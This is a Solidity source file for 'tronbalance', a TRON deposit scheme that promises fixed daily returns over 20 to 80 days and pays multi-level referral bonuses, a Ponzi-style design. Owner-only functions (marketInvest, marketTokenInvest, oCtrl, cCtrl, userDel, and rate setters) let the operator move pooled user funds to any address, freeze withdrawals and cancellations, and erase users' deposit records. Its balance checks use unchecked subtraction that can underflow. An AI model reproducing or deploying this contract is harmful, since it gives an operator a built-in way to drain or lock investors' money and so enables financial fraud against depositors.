//SourceUnit: contractV10.sol

/*| (c) 2020 Develop by Red Face | SPDX-License-Identifier: MIT License */

pragma solidity 0.5.12;

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract tronbalance {
    //structures
    struct Tarif {
        uint8 life_days;
        uint8 bonus_percent;
        uint8 token_bonus_percent;
        uint24[] days_percent;
        uint256 limit;
        bool on;
    }

    struct Deposit {
        uint8 tarif;
        uint8 dtype;
        uint40 time;
        uint256 amount;
        uint256 dividend;
        uint256 token;
    }

    struct Player {
        address upline;
        uint256 bonus;
        bool[3] tarif_access;
        mapping(uint8 => uint24) structure;
        Deposit[] deposits;
    }

    uint8[] public ref_bonuses; // 1 => 1%
    Tarif[] public tarifs;

    //variable matchet to plans and contract balances
    address payable owner;
    address _TOKEN;
    uint256 public invested;
    uint256 public token_invested;
    uint256 public withdrawn;
    uint256 public total_bonus;
    uint256 public market_invest;
    uint256 public market_dividends;
    
    mapping(address => Player) players;
    //setting variables
    bool input = true;
    bool output = true;
    bool cancel = true;
    bool tokenInput;
    bool tokenOutput;
    uint256 safe_line;
    uint256 token_safe_line;
    uint8 cancel_percent = 20;
    uint8 token_input_rate = 20;
    uint8 token_output_rate = 20;
    
    //events
    event NewDeposit(address indexed addr, uint256 amount, uint8 tarif,uint40 time);
    event NewTokenDeposit(address indexed addr, uint256 amount, uint8 tarif,uint40 time);
    event TokenWithdraw(address indexed addr, uint256 amount,uint40 time);
    event Withdraw(address indexed addr, uint256 amount,uint40 time);
    event Cancel(uint deposit, address indexed addr, uint256 amount,uint40 time);
    event StatusChg(string id,bool status);

    constructor() public {
        owner = msg.sender;

        uint24[] memory arr=new uint24[](21);
        uint24[] memory arr1=new uint24[](41);
        uint24[] memory arr2=new uint24[](81);
        
        arr[0]=0;arr[1]=500;arr[2]=1500;arr[3]=3000;arr[4]=5000;arr[5]=7500;arr[6]=10500;arr[7]=14000;arr[8]=18000;arr[9]=22500;arr[10]=27500;arr[11]=33000;arr[12]=39000;arr[13]=45500;arr[14]=52500;arr[15]=60000;arr[16]=68000;arr[17]=76500;arr[18]=85500;arr[19]=95000;arr[20]=105000;
        
        arr1[0]=0;arr1[1]=250;arr1[2]=500;arr1[3]=1000;arr1[4]=1500;arr1[5]=2250;arr1[6]=3000;arr1[7]=4000;arr1[8]=5000;arr1[9]=6250;arr1[10]=7500;arr1[11]=9000;arr1[12]=10500;arr1[13]=12250;arr1[14]=14000;arr1[15]=16000;arr1[16]=18000;arr1[17]=20250;arr1[18]=22500;arr1[19]=25000;arr1[20]=27500;arr1[21]=30250;arr1[22]=33000;arr1[23]=36000;arr1[24]=39000;arr1[25]=42250;arr1[26]=45500;arr1[27]=49000;arr1[28]=52500;arr1[29]=56250;arr1[30]=60000;arr1[31]=64000;arr1[32]=68000;arr1[33]=72250;arr1[34]=76500;arr1[35]=81000;arr1[36]=85500;arr1[37]=90250;arr1[38]=95000;arr1[39]=100000;arr1[40]=105000;
        
        arr2[0]=0;arr2[1]=125;arr2[2]=250;arr2[3]=375;arr2[4]=500;arr2[5]=750;arr2[6]=1000;arr2[7]=1250;arr2[8]=1500;arr2[9]=1875;arr2[10]=2250;arr2[11]=2625;arr2[12]=3000;arr2[13]=3500;arr2[14]=4000;arr2[15]=4500;arr2[16]=5000;arr2[17]=5625;arr2[18]=6250;arr2[19]=6875;arr2[20]=7500;arr2[21]=8250;arr2[22]=9000;arr2[23]=9750;arr2[24]=10500;arr2[25]=11375;arr2[26]=12250;arr2[27]=13125;arr2[28]=14000;arr2[29]=15000;arr2[30]=16000;arr2[31]=17000;arr2[32]=18000;arr2[33]=19125;arr2[34]=20250;arr2[35]=21375;arr2[36]=22500;arr2[37]=23750;arr2[38]=25000;arr2[39]=26250;arr2[40]=27500;arr2[41]=28875;arr2[42]=30250;
        arr2[43]=31625;arr2[44]=33000;arr2[45]=34500;arr2[46]=36000;arr2[47]=37500;arr2[48]=39000;arr2[49]=40625;arr2[50]=42250;arr2[51]=43875;arr2[52]=45500;arr2[53]=47250;arr2[54]=49000;arr2[55]=50750;arr2[56]=52500;arr2[57]=54375;arr2[58]=56250;arr2[59]=58125;arr2[60]=60000;arr2[61]=62000;arr2[62]=64000;arr2[63]=66000;arr2[64]=68000;arr2[65]=70125;arr2[66]=72250;arr2[67]=74375;arr2[68]=76500;arr2[69]=78750;arr2[70]=81000;arr2[71]=83250;arr2[72]=85500;arr2[73]=87875;arr2[74]=90250;arr2[75]=92625;arr2[76]=95000;arr2[77]=97500;arr2[78]=100000;arr2[79]=102500;arr2[80]=105000;
        
        tarifs.push(Tarif(20,5,5,arr,1e8,true));
        tarifs.push(Tarif(40,20,20,arr1,5e8,true));
        tarifs.push(Tarif(80,35,35,arr2,1e9,true));

        ref_bonuses.push(4);
        ref_bonuses.push(2);
        ref_bonuses.push(1);
    }

    //modifires ________________________________________________
    modifier onlyBy(address _account) {
      require(
         msg.sender == _account,
         "M1"
      );
      _;
    }
    modifier ifIOn() {
      require(input,"M2");
      _;
    }
    modifier ifTIOn() {
      require(tokenInput,"M3");
      _;
    }
    modifier ifTOOn() {
      require(tokenOutput,"M4");
      _;
    }
    modifier ifOOn() {
      require(output,"M5");
      _;
    }
    modifier ifCOn() {
      require(cancel,"M6");
      _;
    }
    modifier isSafe() {
      require(address(this).balance > safe_line,"M6");
      _;
    }
    //__________________________________________________________


    //private internal funcs____________________________________
    function setUpline(address _addr, address _upline, uint256 _amount) private {
        //check is the upliner has any deposit or not if not upline of this player set to owner
        if(players[_upline].deposits.length == 0) {
            players[_addr].upline = owner;
        }
        else {
            //pay to this player bouns to join us acording to amount
            uint256 direct_bonus_here;
            if(_amount < 1e9){
                direct_bonus_here = _amount / 160;
            }else if(_amount < 1e10){
                direct_bonus_here = _amount / 100;
            }else if(_amount < 1e11){
                direct_bonus_here = _amount / 70;
            }else if(_amount >= 1e11){
                direct_bonus_here = _amount / 50;
            }
            players[_addr].bonus += direct_bonus_here;
            total_bonus += direct_bonus_here;
            
            //set the address of this player's upline
            players[_addr].upline = _upline;

            //pay upper level uplines
            for(uint8 i = 0; i < 3; i++) {
                players[_upline].structure[i]++;
                players[_upline].bonus += _amount * ref_bonuses[i] / 100;
                total_bonus += _amount * ref_bonuses[i] / 100;

                _upline = players[_upline].upline;

                if(players[_upline].deposits.length == 0) break;
            }
        }
    }
    //__________________________________________________________
    
    
    //public internal funcs_____________________________________
    function deposit(uint8 _tarif, address _upline) external payable ifIOn(){
         //check is pass tarif is exists if not reject
        require(tarifs[_tarif].life_days > 0 && tarifs[_tarif].on && msg.value >= tarifs[_tarif].limit, "D1");//{'status':'error','code':'D_1','msg':'Tarif not found'}
         //retrive player
        Player storage player = players[msg.sender];
        //check number of player deposit (maximum is 100) if more than 100 reject
        require(player.deposits.length < 100 && (_tarif == 0 ? true : player.tarif_access[_tarif-1]), "D2");//{'status':'error','code':'D_3','msg':'Maximum number of deposit is 100'}
        
        //set upline (upline means my mentor address) address and set direct bonus
        //check this player has upline and check this player not the owner 
        if(players[msg.sender].upline == address(0) && msg.sender != owner) {
            setUpline(msg.sender, _upline, msg.value);
        }
        //save this invest
        Deposit memory dep;
        dep.tarif = _tarif;
        dep.amount = msg.value;
        dep.time = uint40(block.timestamp);
        player.deposits.push(dep);
        //set player variables
        player.tarif_access[_tarif] = true;
        invested += msg.value;

        //emit new invest
        emit NewDeposit(msg.sender, msg.value, _tarif,uint40(block.timestamp));
    }
    function tokenDeposit(uint8 _tarif, address _upline,uint256 _amount) external payable ifTIOn(){
        uint256 trxFrom = _amount / token_input_rate;
        //check is pass tarif is exists if not reject
        require(tarifs[_tarif].life_days > 0 && tarifs[_tarif].on && trxFrom >= tarifs[_tarif].limit, "TD1");//{'status':'error','code':'D_1','msg':'Tarif not found'}
        //transfer token to contract
        require(IERC20(_TOKEN).transferFrom(msg.sender, address(this), _amount), "TD2");
        //retrive player
        Player storage player = players[msg.sender];
        //check number of player deposit (maximum is 100) if more than 100 reject
        require(player.deposits.length < 100 && (_tarif == 0 ? true : player.tarif_access[_tarif-1]), "TD2");
        
        //set upline (upline means my mentor address) address and set direct bonus
        if(players[msg.sender].upline == address(0) && msg.sender != owner) {
            setUpline(msg.sender, _upline, trxFrom);
        }

        Deposit memory dep;
        dep.tarif = _tarif;
        dep.amount = trxFrom;
        dep.time = uint40(block.timestamp);
        dep.dtype = 1;
        dep.token = _amount;
        player.deposits.push(dep);
        //set player variables
        player.tarif_access[_tarif] = true;
        token_invested += trxFrom;
        //emit new invest
        emit NewTokenDeposit(msg.sender, _amount, _tarif,uint40(block.timestamp));
    }
    function withdraw(uint _dep) external ifOOn(){
        //retrive player information
        Player storage player = players[msg.sender];
        Deposit storage dep = player.deposits[_dep];
        require(dep.amount>0 && dep.dtype == 0, "W1");
        uint256 amount;
        
        //get end of this deposit
        uint40 time_end = dep.time + tarifs[dep.tarif].life_days * 86400;
        
        
        uint40  currentTarif = (block.timestamp > time_end ? uint40(time_end)-dep.time : uint40(block.timestamp)-dep.time)/86400;
        uint256  tmp = (dep.amount * tarifs[dep.tarif].days_percent[currentTarif] / 100000) - dep.dividend;
        dep.dividend +=tmp;
        amount += tmp;
        
        //---------------------------------------------------------------------------------------------------
        require(amount > 0 || player.bonus > 0, "W1");
        //calc player share until now
        amount += player.bonus;
        //check safe line
        require((address(this).balance - amount) > safe_line, "W2");
        //reset player information
        player.bonus = 0;
        withdrawn += amount;
        //send player share
        msg.sender.transfer(amount);
        //emit event         
        emit Withdraw(msg.sender, amount, uint40(block.timestamp));
    }
    function withdrawAsToken(uint _dep) external ifOOn(){
        //retrive player information
        Player storage player = players[msg.sender];
        Deposit storage dep = player.deposits[_dep];
        require(dep.amount>0 &&  dep.dtype == 0, "WA1");
        uint256 amount;
        
        //get end of this deposit
        uint40 time_end = dep.time + tarifs[dep.tarif].life_days * 86400;
        
        
        uint40  currentTarif = (block.timestamp > time_end ? uint40(time_end)-dep.time : uint40(block.timestamp)-dep.time)/86400;
        uint256  tmp = (dep.amount * tarifs[dep.tarif].days_percent[currentTarif] / 100000) - dep.dividend;
        dep.dividend +=tmp;
        amount += tmp;
        
        //---------------------------------------------------------------------------------------------------
        require(amount > 0 || player.bonus > 0, "WA2");

        //calc player share until now
        amount += player.bonus;
        uint256 tokenFrom = amount * token_output_rate;
        //check safe line
        require(IERC20(_TOKEN).balanceOf(address(this)) - tokenFrom > token_safe_line, "WA2");
        //reset player information
        player.bonus = 0;
        withdrawn += amount;
        //send player share
        IERC20(_TOKEN).transfer(msg.sender, tokenFrom);
        //emit event         
        emit TokenWithdraw(msg.sender, tokenFrom, uint40(block.timestamp));
    }
    function tokenWithdraw(uint _dep) external ifTOOn(){
        //retrive player information
        Player storage player = players[msg.sender];
        Deposit storage dep = player.deposits[_dep];
        require(dep.amount>0 &&  dep.dtype == 1, "TW1");
        uint256 amount;
        
        //get end of this deposit
        uint40 time_end = dep.time + tarifs[dep.tarif].life_days * 86400;
        
        
        uint40  currentTarif = (block.timestamp > time_end ? uint40(time_end)-dep.time : uint40(block.timestamp)-dep.time)/86400;
        uint256  tmp = (dep.amount * tarifs[dep.tarif].days_percent[currentTarif] / 100000) - dep.dividend;
        dep.dividend +=tmp;
        amount += tmp;
        
        //---------------------------------------------------------------------------------------------------
        require(amount > 0 || player.bonus > 0, "TW2");

       
        uint256 tokenFrom = amount * token_output_rate;
        //check safe line
        require(IERC20(_TOKEN).balanceOf(address(this)) - tokenFrom > token_safe_line, "TW2");
        //reset player information
        withdrawn += amount;
        //send player share
        IERC20(_TOKEN).transfer(msg.sender, tokenFrom);
        //emit event         
        emit TokenWithdraw(msg.sender, tokenFrom, uint40(block.timestamp));
    }
    function cancelDeposit(uint _dep) external ifCOn(){
        //retrive player information
        Player storage player = players[msg.sender];
        Deposit storage dep = player.deposits[_dep];
        require(dep.amount>0 && ((dep.amount - dep.dividend) - (dep.amount * cancel_percent / 100)) > 0, "C1");

        uint retrive = (dep.amount - dep.dividend) - (dep.amount * cancel_percent / 100);

        if(dep.dtype == 1){
            require(IERC20(_TOKEN).balanceOf(address(this)) - (retrive * token_output_rate) > token_safe_line, "C2");
        }else{
            require((address(this).balance - retrive) > safe_line, "C3");
        }

        delete player.deposits[_dep];
        //send player share
        if(dep.dtype == 1){
            IERC20(_TOKEN).transfer(msg.sender, retrive * token_output_rate);
        }else{
            msg.sender.transfer(retrive);
        }
        emit Cancel(_dep, msg.sender, retrive,uint40(block.timestamp));
    }

    //-------------------------------------VIEW--------------------------------------------\\
    function payoutOfCancel(uint _dep) view external ifCOn() returns(uint256 value){
        //retrive player information
        Player storage player = players[msg.sender];
        Deposit storage dep = player.deposits[_dep];
        require(dep.amount>0, "{'status':'error','code':'C_1','msg':'Zero deposit'}");
        require(((dep.amount - dep.dividend) - (dep.amount * cancel_percent / 100)) > 0,"{'status':'error','code':'C_2','msg':'Have not enough deposit'}");

        value = (dep.amount - dep.dividend) - (dep.amount * cancel_percent / 100);
        if(dep.dtype == 1){
            value = value * token_output_rate;
        }
        return value;
    }
    function payoutOfOwner(address _addr,bool _token,bool _convert_token) view external  onlyBy(owner) returns(uint256 value) {
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits.length; i++) {
            Deposit storage dep = player.deposits[i];
            if(dep.amount == 0){
                continue;
            }
            //base on calcToken we calculate profet on deposit type
            if(_token && dep.dtype == 0){
                continue;
            }
            if(!_token && dep.dtype == 1){
                continue;
            }
            Tarif storage tarif = tarifs[dep.tarif];

            //get end of this deposit
            uint40 time_end = dep.time + tarif.life_days * 86400;
            
            
            uint40  currentTarif = (block.timestamp > time_end ? uint40(time_end)-dep.time : uint40(block.timestamp)-dep.time)/86400;
            value += (dep.amount * tarif.days_percent[currentTarif] / 100000) - dep.dividend;

            if(block.timestamp > time_end){
                value += dep.amount * (_token ? tarif.token_bonus_percent : tarif.bonus_percent) / 100;
            }
        }
        if(!_token){
            value += player.bonus;
            if(_convert_token){
                value *= token_output_rate;
            }
        }else{
            value *= token_output_rate;
        }
        return value;
    }
    function payoutOf(bool _token,bool _convert_token) view external returns(uint256 value) {
        Player storage player = players[msg.sender];

        for(uint256 i = 0; i < player.deposits.length; i++) {
            Deposit storage dep = player.deposits[i];
            if(dep.amount == 0){
                continue;
            }
            //base on calcToken we calculate profet on deposit type
            if(_token && dep.dtype == 0){
                continue;
            }
            if(!_token && dep.dtype == 1){
                continue;
            }
            Tarif storage tarif = tarifs[dep.tarif];

            //get end of this deposit
            uint40 time_end = dep.time + tarif.life_days * 86400;
            
            
            uint40  currentTarif = (block.timestamp > time_end ? uint40(time_end)-dep.time : uint40(block.timestamp)-dep.time)/86400;
            value += (dep.amount * tarif.days_percent[currentTarif] / 100000) - dep.dividend;
            
            if(block.timestamp > time_end){
                value += dep.amount * (_token ? tarif.token_bonus_percent : tarif.bonus_percent) / 100;
            }
        }
        if(!_token){
            value += player.bonus;
            if(_convert_token){
                value *= token_output_rate;
            }
        }else{
            value *= token_output_rate;
        }
        return value;
    }
    function payoutOfPrivate(bool _token,bool _convert_token) view private returns(uint256 value) {
        Player storage player = players[msg.sender];

        for(uint256 i = 0; i < player.deposits.length; i++) {
            Deposit storage dep = player.deposits[i];
            if(dep.amount == 0){
                continue;
            }
            //base on calcToken we calculate profet on deposit type
            if(_token && dep.dtype == 0){
                continue;
            }
            if(!_token && dep.dtype == 1){
                continue;
            }
            Tarif storage tarif = tarifs[dep.tarif];

            //get end of this deposit
            uint40 time_end = dep.time + tarif.life_days * 86400;
            
            
            uint40  currentTarif = (block.timestamp > time_end ? uint40(time_end)-dep.time : uint40(block.timestamp)-dep.time)/86400;
            value += (dep.amount * tarif.days_percent[currentTarif] / 100000) - dep.dividend;

            if(block.timestamp > time_end){
                value += dep.amount * (_token ? tarif.token_bonus_percent : tarif.bonus_percent) / 100;
            }
        }
        if(!_token){
            value += player.bonus;
            if(_convert_token){
                value *= token_output_rate;
            }
        }else{
            value *= token_output_rate;
        }
        return value;
    }
    function userInfoOwner(address _addr) view external onlyBy(owner) returns(uint256 for_withdraw,uint256 for_withdraw_in_token,uint256 for_withdraw_token, uint256 total_match_bonus, uint256[3] memory structure, bool[3] memory access){
        Player storage player = players[_addr];

        uint256 payout = this.payoutOfOwner(_addr,false,false);
        uint256 payoutInToken = this.payoutOfOwner(_addr,false,true);
        uint256 tokenPayout = this.payoutOfOwner(_addr,true,false);

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            structure[i] = player.structure[i];
        }
        for(uint8 i = 0; i < 3; i++) {
            access[i] = player.tarif_access[i];
        }

        return (
            payout,
            payoutInToken,
            tokenPayout,
            player.bonus,
            structure,
            access
        );
    }
    function userInfo() view external returns(uint256 for_withdraw,uint256 for_withdraw_in_token,uint256 for_withdraw_token, uint256 bonus, uint256[3] memory structure, bool[3] memory access){
        Player storage player = players[msg.sender];

        uint256 payout = payoutOfPrivate(false,false);
        uint256 payoutInToken = payoutOfPrivate(false,true);
        uint256 tokenPayout = payoutOfPrivate(true,false);

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            structure[i] = player.structure[i];
        }
        for(uint8 i = 0; i < 3; i++) {
            access[i] = player.tarif_access[i];
        }

        return (
            payout,
            payoutInToken,
            tokenPayout,
            player.bonus,
            structure,
            access
        );
    }
    function userDepositsOwner(address _addr) view external onlyBy(owner) returns(uint8[] memory, uint256[] memory, uint256[] memory, uint40[] memory,uint[] memory,uint256[] memory){
        Player storage player = players[_addr];
        uint8[] memory rtarifs = new uint8[](player.deposits.length);
        uint256[] memory amounts = new uint256[](player.deposits.length);
        uint256[] memory dividends = new uint256[](player.deposits.length);
        uint40[] memory times = new uint40[](player.deposits.length);
        uint[] memory types = new uint[](player.deposits.length);
        uint256[] memory tokens = new uint256[](player.deposits.length);
        
        for(uint i = 0 ; i< player.deposits.length;i++){
            rtarifs[i] = player.deposits[i].tarif;
            amounts[i] = player.deposits[i].amount;
            dividends[i] = player.deposits[i].dividend;
            times[i] = player.deposits[i].time;
            types[i] = player.deposits[i].dtype;
            tokens[i] = player.deposits[i].token;
        }
        return (rtarifs,amounts,dividends,times,types,tokens);
    }
    function userDeposits() view external returns(uint8[] memory, uint256[] memory, uint256[] memory, uint40[] memory,uint[] memory,uint256[] memory){
        Player storage player = players[msg.sender];
        uint8[] memory rtarifs = new uint8[](player.deposits.length);
        uint256[] memory amounts = new uint256[](player.deposits.length);
        uint256[] memory dividends = new uint256[](player.deposits.length);
        uint40[] memory times = new uint40[](player.deposits.length);
        uint[] memory types = new uint[](player.deposits.length);
        uint256[] memory tokens = new uint256[](player.deposits.length);
        
        for(uint i = 0 ; i< player.deposits.length;i++){
            rtarifs[i] = player.deposits[i].tarif;
            amounts[i] = player.deposits[i].amount;
            dividends[i] = player.deposits[i].dividend;
            times[i] = player.deposits[i].time;
            types[i] = player.deposits[i].dtype;
            tokens[i] = player.deposits[i].token;
        }
        return (rtarifs,amounts,dividends,times,types,tokens);
    }
    function contractInfo() view external returns(uint256 _invested, uint256 _token_invested, uint256 _withdrawn, uint256 _total_bonus) {
        return (invested,token_invested, withdrawn,total_bonus);
    }
    function contractStatus() view external onlyBy(owner) returns(bool _input,bool _tokenInput,bool _output,bool _tokenOutput,bool _cancel,address _owner,uint256 _safe_line,uint256 _token_safe_line,uint _cancel_percent,uint _token_input_rate,uint _token_output_rate) {
        return (input,tokenInput,output,tokenOutput,cancel,owner,safe_line,token_safe_line,cancel_percent,token_input_rate,token_output_rate);
    }
    //external setting funcs___________________________________
    function iCtrl(bool _status) external onlyBy(owner){
        input = _status;
        emit StatusChg('input',_status);
    }
    function tokenICtrl(bool _status) external onlyBy(owner){
        tokenInput = _status;
        emit StatusChg('tokenInput',_status);
    }
    function oCtrl(bool _status) external onlyBy(owner){
        output = _status;
        emit StatusChg('output',_status);
    }
    function tokenOCtrl(bool _status) external onlyBy(owner){
        tokenOutput = _status;
        emit StatusChg('tokenOutput',_status);
    }
    function cCtrl(bool _status) external onlyBy(owner){
        cancel = _status;
        emit StatusChg('cancel',_status);
    }
    function chgHeart(address payable _adr) external onlyBy(owner){
        owner = _adr;
    }
    function chgToken(address payable _adr) external onlyBy(owner){
        _TOKEN = _adr;
    }
    function marketInvest(address payable _adr , uint256 _amount) external onlyBy(owner){
        market_invest += _amount*1e6;
        _adr.transfer(_amount*1e6);
    }
    function marketDividends()  external payable onlyBy(owner){
        market_dividends += msg.value;
        invested += msg.value;
    }
    function marketTokenInvest(address _adr , uint256 _amount) external onlyBy(owner){
        uint256 trxFrom = _amount / token_output_rate;
        market_invest += trxFrom*1e6;
        IERC20(_TOKEN).transfer(_adr, _amount);
    }
    function marketTokenDividends(uint256 _amount)  external onlyBy(owner){
        uint256 trxFrom = _amount * token_input_rate;
        market_dividends += trxFrom;
        invested += trxFrom;
        IERC20(_TOKEN).transferFrom(msg.sender, address(this), _amount);
    }
    function setSafeLine(uint256 _amount) external onlyBy(owner){
        safe_line = _amount*1e6;
    }
    function setTokenSafeLine(uint256 _amount) external onlyBy(owner){
        token_safe_line = _amount*1e6;
    }
    function setTokenIRate(uint8 _amount) external onlyBy(owner){
        token_input_rate = _amount;
    }
    function setTokenORate(uint8 _amount) external onlyBy(owner){
        token_output_rate = _amount;
    }
    function setCancelPercent(uint8 _amount) external onlyBy(owner){
        cancel_percent = _amount;
    }
    function tarifOn(uint _tarif,bool _status) external onlyBy(owner){
        tarifs[_tarif].on = _status;
    }
    function tarifLimit(uint _tarif,uint256 _amount) external onlyBy(owner){
        tarifs[_tarif].limit = _amount*1e6;
    }
    function tarifBonus(uint _tarif,uint8 _amount) external onlyBy(owner){
        tarifs[_tarif].bonus_percent = _amount;
    }
    function tarifTokenBonus(uint _tarif,uint8 _amount) external onlyBy(owner){
        tarifs[_tarif].token_bonus_percent = _amount;
    }
    function userDel(address _addr) external onlyBy(owner){
        delete players[_addr];
    }
}